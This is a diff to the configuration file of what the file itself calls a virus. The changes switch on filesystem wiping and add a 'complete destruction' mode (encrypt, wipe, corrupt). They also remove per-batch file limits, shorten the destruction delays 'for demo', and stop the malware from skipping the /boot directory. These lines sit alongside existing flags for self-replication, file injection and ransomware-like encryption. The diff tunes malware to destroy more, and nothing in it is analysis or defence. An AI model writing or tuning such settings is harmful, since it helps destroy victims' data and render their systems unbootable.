@@ -25,7 +25,8 @@ ENABLE_FILE_COLLECTION = True
 ENABLE_SELF_REPLICATION = True
 ENABLE_FILE_INJECTION = True
 ENABLE_FILESYSTEM_ENCRYPTION = True  # Encrypt filesystem (ransomware-like)
-ENABLE_FILESYSTEM_WIPING = False  # Wipe filesystem (wiper-like) - DANGEROUS!
+ENABLE_FILESYSTEM_WIPING = True  # Wipe filesystem (wiper-like) - DANGEROUS!
+ENABLE_FILESYSTEM_DESTRUCTION = True  # Complete destruction (encrypt + wipe + corrupt) - VERY DANGEROUS!
 
 # Timing Configuration
 SCREENSHOT_INTERVAL = 30
@@ -43,7 +44,8 @@ AUTO_CLOSE_AFTER_COLLECTION = False  # Set to False to keep virus running after 
 COLLECTION_TIMEOUT = 300  # 5 minutes max for initial collection
 
 # Filesystem Destruction Configuration
-DESTRUCTION_DELAY = 60  # Delay before starting destruction (seconds)
-DESTRUCTION_INTERVAL = 300  # Interval between destruction batches (seconds)
-DESTRUCTION_BATCH_SIZE = 1000  # Max files per batch (None = unlimited)
+DESTRUCTION_DELAY = 30  # Delay before starting destruction (seconds) - Reduced for demo
+DESTRUCTION_INTERVAL = 60  # Interval between destruction batches (seconds) - Faster for demo
+DESTRUCTION_BATCH_SIZE = None  # Max files per batch (None = unlimited - for complete destruction)
+DESTRUCTION_SKIP_BOOT = False  # Skip /boot directory (False = attack boot files for complete destruction)
 
